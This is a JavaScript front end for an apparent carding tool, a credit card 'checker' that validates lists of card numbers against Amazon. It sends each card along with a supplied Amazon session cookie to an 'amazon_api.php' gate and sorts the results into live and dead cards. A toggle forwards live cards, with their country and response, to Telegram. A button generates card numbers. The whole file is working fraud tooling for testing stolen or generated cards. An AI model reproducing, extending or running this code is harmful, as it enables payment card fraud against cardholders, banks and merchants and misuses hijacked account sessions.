$(document).ready(function() {
    // Inicialización de variables
    let listaCartoes = [];
    let running = false;
    let testeadas = 0;
    let indice = 0;
    let livesNum = 0;
    let deadsNum = 0;
    let errorNum = 0;
    let paused = false;

    // Función para inicializar overlayScrollbars
    function initOverlayScrollbars() {
        if (typeof OverlayScrollbars !== 'undefined') {
            OverlayScrollbars(document.querySelectorAll('.table-responsive'), {
                scrollbars: {
                    theme: 'os-theme-dark'
                }
            });
        }
    }

    // Inicializar overlayScrollbars después de que se cargue la página
    setTimeout(initOverlayScrollbars, 1000);

    // Asignar la función genCC al botón
    $('.btn-theme').on('click', function() {
        if ($(this).text().includes('Generate Cards')) {
            genCC();
        }
    });

    // Manejar el inicio del check
    $('#chk-start').on('click', async function() {
        const tarjetas = $('#result').val().trim().split("\n").filter(t => t.trim() !== "");
        const cookie = $('#cookie-input-2').val()?.trim();
        const pais = $('#pais').val();

        if (!cookie || !pais) {
            Swal.fire("⚠️ Faltan datos", "Ingresa cookie y país para Amazon.", "warning");
            return;
        }

        if (tarjetas.length === 0) {
            Swal.fire("⚠️ Lista vacía", "Ingresa tarjetas para procesar.", "warning");
            return;
        }

        $('#estatus').removeClass().addClass('badge badge-info').text("Procesando tarjetas...");
        running = true;
        paused = false;

        // Actualizar contadores
        $('.val-total').text(tarjetas.length);
        $('.val-tested').text('0');
        $('.val-lives').text('0');
        $('.val-dies').text('0');
        $('.val-errors').text('0');
        $('#total').text(tarjetas.length);
        $('#checked').text('0');
        $('#livestat').text('0');
        $('#diestat').text('0');
        $('#errorstat').text('0');

        // Limpiar contenedores
        $('#lives').empty();
        $('#dies').empty();
        $('#errors').empty();

        // Reproducir sonido de inicio
        document.getElementById('iniciaSonido').play().catch(e => console.log('Error al reproducir sonido:', e));

        for (const tarjeta of tarjetas) {
            if (!running) break;

            if (paused) {
                await new Promise(resolve => {
                    const checkIfResumed = setInterval(() => {
                        if (!paused) {
                            clearInterval(checkIfResumed);
                            resolve();
                        }
                    }, 100);
                });
            }

            try {
                const formData = new FormData();
                formData.append("lista", tarjeta);
                formData.append("cookies", cookie);
                formData.append("pais", pais);

                const response = await fetch("amazon_api.php", {
                    method: "POST",
                    body: formData
                });

                const data = await response.json();
                const r = data.response_api || data;
                
                // Función para limpiar HTML
                function stripHtml(html) {
                    var tmp = document.createElement("DIV");
                    tmp.innerHTML = html;
                    return tmp.textContent || tmp.innerText || "";
                }

                if (r.status === "success") {
                    // Extraer el banco del mensaje usando regex
                    let bankInfo = "";
                    const match = r.message.match(/\|\d{2}\|\d{4}\|\d{3} ([^<]+)/);
                    if (match && match[1]) {
                        bankInfo = match[1].trim();
                    }

                    // Construir la línea compacta con los primeros 6 dígitos en blanco y el resto en azul
                    let cardSplit = r.card.split('|')[0];
                    let cardRest = r.card.substring(6);
                    let cardFormatted = `<span style='color:#fff;font-weight:bold;'>${cardSplit.substring(0,6)}</span><span style='color:#00aaff;font-weight:bold;'>${cardSplit.substring(6)}</span>${r.card.includes('|') ? r.card.substring(cardSplit.length) : ''}`;
                    let linea = `${cardFormatted} <span style=\"color:#00ff99;\">✅</span>`;
                    if (r.status1) linea += ` <span style=\"color:#00ff99;\">${r.status1}</span>`;
                    if (bankInfo) linea += ` <span style=\"color:#fff;\">➔ ${bankInfo}</span>`;
                    if (r.removed) linea += ` <span style=\"color:#00ff99;\">(${r.removed})</span>`;
                    $('#lives').append(`<div style=\"margin-bottom:2px;\">${linea}</div>`);
                    livesNum++;
                    $('.val-lives').text(livesNum);
                    $('#livestat').text(livesNum);
                    document.getElementById('detectaLive').play().catch(e => console.log('Error al reproducir sonido:', e));
                    
                    if ($('#telegramToggle').is(':checked')) {
                        fetch('inc/telegram.php', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            credentials: 'include',
                            body: JSON.stringify({
                                card: r.card,
                                gate: 'amazon',
                                pais: pais,
                                response: r.status1
                            })
                        }).catch(error => {
                            console.error('Error al enviar live a Telegram:', error);
                        });
                    }
                } else if (r.status === "error") {
                    if (
                        r.message.includes("Cookies") ||
                        r.message.includes("Dirección")
                    ) {
                        $('#errors').append(`${r.card} ⚠️ ${stripHtml(r.message)}<br>`);
                        errorNum++;
                        $('.val-errors').text(errorNum);
                        $('#errorstat').text(errorNum);
                    } else if (
                        r.message.includes('Erro ao obter acesso passkey') ||
                        r.message.includes('Cookies não detectado') ||
                        r.message.includes('entre em minha conta e depois segurança')
                    ) {
                        $('#errors').append(`${r.card} ⚠️ <span style="color:red;font-weight:bold;">Cambia la cookie de Amazon por una nueva</span><br>`);
                        errorNum++;
                        $('.val-errors').text(errorNum);
                        $('#errorstat').text(errorNum);
                    } else {
                        // Mostrar los primeros 6 dígitos en morado y el resto en rojo
                        let cardSplit = r.card.split('|')[0];
                        let cardDeclined = `<span style='color:#b388ff;font-weight:bold;'>${cardSplit.substring(0,6)}</span><span style='color:#ff1744;font-weight:bold;'>${cardSplit.substring(6)}</span>${r.card.includes('|') ? r.card.substring(cardSplit.length) : ''}`;
                        $('#dies').append(`${cardDeclined} ❌ ${stripHtml(r.status1)}<br>`);
                        deadsNum++;
                        $('.val-dies').text(deadsNum);
                        $('#diestat').text(deadsNum);
                    }
                }
                
                testeadas++;
                $('.val-tested').text(testeadas);
                $('#checked').text(testeadas);

            } catch (error) {
                console.error("❌ Error en la API:", error);
                $('#estatus').removeClass().addClass('badge badge-danger').text("⚠️ Fallo en la conexión");

                $('#errors').append(`${tarjeta} ⚠️ Fallo de conexión<br>`);
                errorNum++;
                $('.val-errors').text(errorNum);
                $('#errorstat').text(errorNum);
                testeadas++;
                $('.val-tested').text(testeadas);
                $('#checked').text(testeadas);

                Swal.fire("❌ Error", "Fallo en la conexión con el servidor", "error");
                break;
            }
        }

        running = false;
        $('#estatus').removeClass().addClass('badge badge-success').text("✅ Proceso completado");

        Swal.fire("✔️ Terminado", "Proceso finalizado correctamente", "success");
    });

    // Manejar la pausa
    $('#chk-pause').on('click', function() {
        paused = !paused;
        Swal.fire(
            paused ? "⏸️ Pausado" : "▶️ Reanudado",
            paused ? "El proceso está pausado." : "El proceso se reanudó.",
            "info"
        );
    });

    // Manejar la detención
    $('#chk-stop').on('click', function() {
        running = false;
        paused = false;
        Swal.fire("🛑 Detenido", "Has detenido el proceso.", "warning");
    });
});

// Estilos para los contenedores
const styleContainers = () => {
    ['lives', 'dies', 'errors'].forEach(id => {
        const container = document.getElementById(id);
        if (container) {
            container.style.background = "#1e1e1e";
            container.style.padding = "12px";
            container.style.borderRadius = "8px";
            container.style.maxHeight = "300px";
            container.style.overflowY = "auto";
            container.style.border = "1px solid #333";
            container.style.fontSize = "14px";
            container.style.whiteSpace = "pre-wrap";
        }
    });
};

// Aplicar estilos cuando el DOM esté listo
document.addEventListener("DOMContentLoaded", styleContainers); 